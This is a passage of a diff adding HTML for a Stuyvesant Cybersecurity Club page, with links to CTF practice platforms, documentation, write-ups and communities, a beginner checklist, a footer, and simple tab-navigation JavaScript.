+                        <li><a href="https://hackthebox.com/" target="_blank" style="color: #3498db;">HackTheBox</a> - Realistic labs</li>
+                        <li><a href="https://tryhackme.com/" target="_blank" style="color: #3498db;">TryHackMe</a> - Guided learning</li>
+                    </ul>
+                </div>
+                <div class="category-card">
+                    <h4>Documentation</h4>
+                    <ul style="font-size: 0.9rem; color: var(--text-light);">
+                        <li><a href="https://ctf101.org/" target="_blank" style="color: #3498db;">CTF101</a> - Category guides</li>
+                        <li><a href="https://book.hacktricks.xyz/" target="_blank" style="color: #3498db;">HackTricks</a> - Cheat sheets</li>
+                        <li><a href="https://owasp.org/" target="_blank" style="color: #3498db;">OWASP</a> - Web security</li>
+                        <li><a href="https://exploit-db.com/" target="_blank" style="color: #3498db;">Exploit-DB</a> - Exploits & techniques</li>
+                    </ul>
+                </div>
+                <div class="category-card">
+                    <h4>Write-ups</h4>
+                    <ul style="font-size: 0.9rem; color: var(--text-light);">
+                        <li><a href="https://ctftime.org/writeups" target="_blank" style="color: #3498db;">CTFtime</a> - Competition write-ups</li>
+                        <li><a href="https://github.com/ctfs" target="_blank" style="color: #3498db;">GitHub CTFs</a> - Write-up repos</li>
+                        <li>Google: "CTF name challenge name writeup"</li>
+                    </ul>
+                </div>
+                <div class="category-card">
+                    <h4>Communities</h4>
+                    <ul style="font-size: 0.9rem; color: var(--text-light);">
+                        <li><a href="https://discord.gg/m8S25R4RWp" target="_blank" style="color: #3498db;">Our Discord</a></li>
+                        <li><a href="https://reddit.com/r/securityCTF" target="_blank" style="color: #3498db;">r/securityCTF</a></li>
+                        <li><a href="https://news.ycombinator.com/" target="_blank" style="color: #3498db;">Hacker News</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="alert-box alert-warning">
+                <div class="alert-title">Getting Started Checklist</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
+                    <ul>
+                        <li>Set up a Linux VM (Kali/Parrot/Ubuntu)</li>
+                        <li>Create accounts on picoCTF, CTFlearn</li>
+                        <li>Install essential tools from above</li>
+                        <li>Bookmark CyberChef and dCode</li>
+                        <li>Learn basic Linux commands</li>
+                    </ul>
+                    <ul>
+                        <li>Practice Python scripting</li>
+                        <li>Complete OverTheWire Bandit</li>
+                        <li>Solve 10+ easy picoCTF challenges</li>
+                        <li>Read 5+ CTF write-ups</li>
+                        <li>Join a CTF competition!</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer>
+        <h3>Stuyvesant Cybersecurity Club</h3>
+        <p>Building the next generation of cybersecurity professionals</p>
+        
+        <div class="footer-links">
+            <a href="CTF1.html">
+                Practice Challenges
+            </a>
+            <a href="CTFReview.html">
+                CTF Review
+            </a>
+            <a href="workshop-crypto.html">
+                Crypto Workshop
+            </a>
+            <a href="workshop-web.html">
+                Web Workshop
+            </a>
+            <a href="workshop-forensics.html">
+                Forensics Workshop
+            </a>
+        </div>
+
+        <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(255,255,255,0.1);">
+            <h4 style="color: #3498db; margin-bottom: 1rem;">External Resources</h4>
+            <div class="footer-links">
+                <a href="https://picoctf.org/" target="_blank">
+                    picoCTF
+                </a>
+                <a href="https://gchq.github.io/CyberChef/" target="_blank">
+                    CyberChef
+                </a>
+                <a href="https://ctftime.org/" target="_blank">
+                    CTFtime
+                </a>
+                <a href="https://overthewire.org/wargames/" target="_blank">
+                    OverTheWire
+                </a>
+            </div>
+        </div>
+
+        <div class="footer-copyright">
+            <p>Stuyvesant Cybersecurity Club</p>
+            <p>© 2025 | Educational purposes only</p>
+        </div>
+    </footer>
+
+    <script>
+        // Wait for the DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            // Get all tab buttons and all content sections
+            const tabs = document.querySelectorAll('.nav-tab');
+            const contents = document.querySelectorAll('.tab-content');
+
+            // Add click event listener to each tab button
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    // 1. Deactivate all tabs and hide all content
+                    tabs.forEach(t => t.classList.remove('active'));
+                    contents.forEach(c => c.classList.remove('active'));
+
+                    // 2. Activate the clicked tab
+                    tab.classList.add('active');
+
+                    // 3. Find the corresponding content section using the data-target attribute
+                    const targetId = tab.getAttribute('data-target');
+                    const targetContent = document.getElementById(targetId);
+
+                    // 4. Show the target content section
+                    if (targetContent) {
+                        targetContent.classList.add('active');
+                    }
+
+                    // 5. Scroll to top of content
+                    window.scrollTo({ top: 200, behavior: 'smooth' });
+                });
+            });
+
+            // Add smooth scrolling for anchor links
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    document.querySelector(this.getAttribute('href')).scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
